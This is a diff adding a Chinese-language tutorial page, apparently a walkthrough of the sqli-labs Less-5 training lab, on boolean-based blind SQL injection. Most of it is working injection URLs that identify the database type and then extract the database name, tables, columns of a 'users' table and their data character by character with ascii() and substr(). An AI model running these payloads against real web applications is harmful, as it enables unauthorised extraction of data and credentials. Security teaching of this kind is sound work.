@@ -1,0 +1,157 @@
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h3 id="1-原理以及手工注入"><a href="#1-原理以及手工注入" class="headerlink" title="1. 原理以及手工注入"></a>1. 原理以及手工注入</h3><hr>
+<p>条件：<code>攻击者无法直接获取到这些信息</code>​Web 的页面的仅仅会返回<code>True</code>​和<code>False</code>​。那么布尔盲注就是进行 SQL 注入之后然后根据页面返回的 True 或者是 False 来得到数据库中的相关信息。这里介绍的是通过 <strong>ascii 码</strong>进行盲注的案例。</p>
+<p>盲注一般用到的一些函数：<code>ascii()</code>​、<code>substr()</code>​、<code>length()</code>​，<code>exists()</code>​、<code>concat()</code>​等</p>
+<p>​<code>http://192.168.1.132:86/Less-5/?id=1</code>​为正确页面，回显如下图：</p>
+<p><img src="/assets/image-20250519082946-eco1m1e.png" alt="image"></p>
+<p>​<code>http://192.168.209.128:88/Less-5/?id=1&#39;</code>​为<strong>错误页面</strong>，发现注入点，回显如下图：</p>
+<p><img src="/assets/image-20250519082954-uibof39.png" alt="image"></p>
+<p>​<code>http://192.168.209.128:88/Less-5/?id=1&#39; and length(database())&gt;5 -- qwe</code>​注：这里 qwe 前需要使用<strong>空格</strong>使用 bool 值进行注入比如：and 1&#x3D;1</p>
+<p><img src="/assets/image-20250519083039-xztdkyj.png" alt="image"></p>
+<h4 id="1-如何判断数据库类型？"><a href="#1-如何判断数据库类型？" class="headerlink" title="1.如何判断数据库类型？"></a>1.如何判断数据库类型？</h4><hr>
+<p>这个例子中出错页面已经告诉了我们<strong>此数据库是 MySQL</strong>，那么当我们不知道是啥数据库的时候，如何分辨是哪个数据库呢？目前主流的数据库都有自己的<strong>特有表</strong>分别如下：</p>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>表名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL</td>
+<td>information_schema.tables</td>
+</tr>
+<tr>
+<td>Access</td>
+<td>msysobjects</td>
+</tr>
+<tr>
+<td>SQLServer</td>
+<td>sysobjects</td>
+</tr>
+</tbody></table>
+<p>通过这些特有表，我们就可以用如下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p>
+<pre><code class="language-bash">//判断是否是Mysql数据库
+http://192.168.209.128:88/Less-5/?id=1&#39; and exists(select * from information_schema.tables)  #
+
+//判断是否是 access数据库
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select * from msysobjects) #
+
+//判断是否是 Sqlserver数据库
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select * from sysobjects) #&#39;
+
+//对于MySQL数据库，information_schema 数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。
+</code></pre>
+<p>​<code>information_schema.tables</code>​存储了数据表的元数据信息，下面对常用的字段进行介绍：</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>table_schema</td>
+<td>记录数据库名</td>
+</tr>
+<tr>
+<td>table_name</td>
+<td>记录数据表名</td>
+</tr>
+<tr>
+<td>table_rows</td>
+<td>关于表的粗略行估计</td>
+</tr>
+<tr>
+<td>data_length</td>
+<td>记录表的大小（单位字节）</td>
+</tr>
+</tbody></table>
+<h4 id="2-判断当前数据库名-以下方法不适用于-access-和-SQL-Server-数据库"><a href="#2-判断当前数据库名-以下方法不适用于-access-和-SQL-Server-数据库" class="headerlink" title="2. 判断当前数据库名(以下方法不适用于 access 和 SQL Server 数据库)"></a>2. 判断当前数据库名(以下方法不适用于 access 和 SQL Server 数据库)</h4><hr>
+<pre><code class="language-bash">1：判断当前数据库的长度，利用二分法
+http://192.168.209.128:88/sqli/Less-5/?id=1&#39; and length(database())&gt;5 --+ //正常显示
+http://192.168.209.128:88/sqli/Less-5/?id=1&#39; and length(database())&gt;10 --+ //不显示任何数据
+http://192.168.209.128:88/sqli/Less-5/?id=1&#39; and length(database())&gt;7 --+ //正常显示
+http://192.168.209.128:88/sqli/Less-5/?id=1&#39; and length(database())&gt;8 --+ //不显示任何数据
+</code></pre>
+<p>大于 7 正常显示，大于 8 不显示，说明大于 7 而不大于 8，所以可知当前数据库长度为 8 img img</p>
+<pre><code class="language-bash">2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断
+
+//判断数据库的第一个字符
+
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr(database(),1,1))&gt;100 --+
+
+//判断数据库的第二个字符
+
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr(database(),2,1))&gt;100 --+
+...........
+</code></pre>
+<p>由此可以判断出当前数据库为 security，注意使用<code>ascii码</code>​转换字符的时候需要使用<code>十进制</code>​</p>
+<hr>
+<h4 id="3-判断当前数据库中的表（语句后面添加–-）"><a href="#3-判断当前数据库中的表（语句后面添加–-）" class="headerlink" title="3. 判断当前数据库中的表（语句后面添加–+）"></a>3. 判断当前数据库中的表（语句后面添加–+）</h4><p><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select * from admin) &#x2F;&#x2F;猜测当前数据库中是否存在 admin 表</p>
+<pre><code class="language-bash">1：判断当前数据库中表的个数
+// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;5 #
+
+2：判断每个表的长度
+//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6
+//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6
+
+3：判断每个表的每个字符的ascii值
+//判断第一个表的第一个字符的ascii值
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 #
+//判断第一个表的第二个字符的ascii值
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 #
+.........
+</code></pre>
+<p>由此可判断出存在表 emails、referers、uagents、users ，猜测 users 表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</p>
+<hr>
+<ol start="4">
+<li><h4 id="判断表中的字段"><a href="#判断表中的字段" class="headerlink" title="判断表中的字段"></a>判断表中的字段</h4></li>
+</ol>
+<p><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select username from admin) &#x2F;&#x2F;如果已经证实了存在 admin 表，那么猜测是否存在 username 字段</p>
+<pre><code class="language-bash">1：判断表中字段的个数
+
+//判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)&gt;5 #
+
+2：判断字段的长度
+
+//判断第一个字段的长度
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1))&gt;5
+
+//判断第二个字段的长度
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1))&gt;5
+
+3：判断字段的ascii值
+
+//判断第一个字段的第一个字符的长度
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))&gt;100
+
+//判断第一个字段的第二个字符的长度
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),2,1))&gt;100
+
+...........
+</code></pre>
+<p>由此可判断出 users 表中存在 id、username、password 字段</p>
+<hr>
+<h4 id="5-判断字段中的数据"><a href="#5-判断字段中的数据" class="headerlink" title="5.判断字段中的数据"></a>5.判断字段中的数据</h4><p>我们知道了 users 中有三个字段 id 、username 、password，我们现在爆出每个字段的数据</p>
+<pre><code class="language-bash">1: 判断数据的长度
+
+// 判断id字段的第一个数据的长度
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select id from users limit 0,1))&gt;5
+
+// 判断id字段的第二个数据的长度
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select id from users limit 1,1))&gt;5
+
+2：判断数据的ascii值
+
+// 判断id字段的第一个数据的第一个字符的ascii值
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select id from users limit 0,1),1,1))&gt;100
+
+// 判断id字段的第一个数据的第二个字符的ascii值
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select id from users limit 0,1),2,1))&gt;100
+
+...........
+</code></pre>
